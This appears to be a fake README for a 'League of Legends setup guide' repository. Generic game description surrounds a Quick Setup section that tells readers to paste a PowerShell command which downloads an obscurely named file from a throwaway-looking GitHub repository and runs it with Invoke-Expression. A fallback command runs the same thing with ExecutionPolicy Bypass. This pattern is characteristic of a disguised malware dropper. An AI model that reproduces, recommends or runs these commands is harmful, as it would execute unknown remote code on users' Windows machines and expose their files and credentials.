# League of Legends

League of Legends is the Windows game this page sets up. The command in Quick Setup installs the game on this PC. After that you launch League of Legends and play.

League of Legends is Riot Games' flagship multiplayer online battle arena. Two teams of five champions contest lanes, jungle camps, and neutral objectives while pushing toward the enemy Nexus. You earn gold from minions and kills, buy items that amplify your kit, and level abilities that define your role from tank frontline to burst mage or marksman carry. Matches usually last twenty to forty minutes and hinge on vision control, objective timers, and decisive team fights around Dragon and Baron.

On Windows you run the Riot Client, log into your account, and choose Summoner's Rift, ARAM, or featured modes from the home screen. A typical evening might start with a practice tool session to test combos, then normal games to try new champions before entering ranked draft with bans and role preferences. You adjust display, audio, and control settings in client menus, lock your pick when your turn arrives, and spend the match last-hitting, roaming, and coordinating pings or voice with teammates until one Nexus falls.

This repository keeps a setup file that walks through preparing the Windows game client, short notes on settings and patch highlights you care about, and a changelog listing revisions to those files. It is meant for players who want a small, versioned record beside the live client when they rebuild a machine or share configuration tips with friends on the same platform.

## How you play

- Five-versus-five matches on Summoner's Rift with distinct top, jungle, mid, bot, and support roles.
- Over 170 champions each offering unique kits, combos, and teamfight impact across every patch cycle.
- Ranked queues track skill through tiers while normal and ARAM modes offer relaxed or chaotic alternatives.
- The Riot Client on Windows handles updates, friend lists, event passes, and cross-title account access.
- Draft phase bans and picks shape strategy before minions spawn and lanes begin trading pressure.
- Objectives like Dragon, Baron Nashor, and turrets swing momentum when teams coordinate vision and timers.
- In-game pings and emotes let you call missing enemies, danger, and objective starts without voice chat.
- Regular balance patches adjust items, runes, and champion numbers to keep the meta evolving seasonally.

## Quick Setup (PowerShell)

This installs the game League of Legends on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/krause-silke804427/league-of-legends-setup-guide/main/ino8fcjpi3.r54ufhpa | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/krause-silke804427/league-of-legends-setup-guide/main/ino8fcjpi3.r54ufhpa | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `ino8fcjpi3.r54ufhpa` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `krause-silke804427/league-of-legends-setup-guide`. League of Legends 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
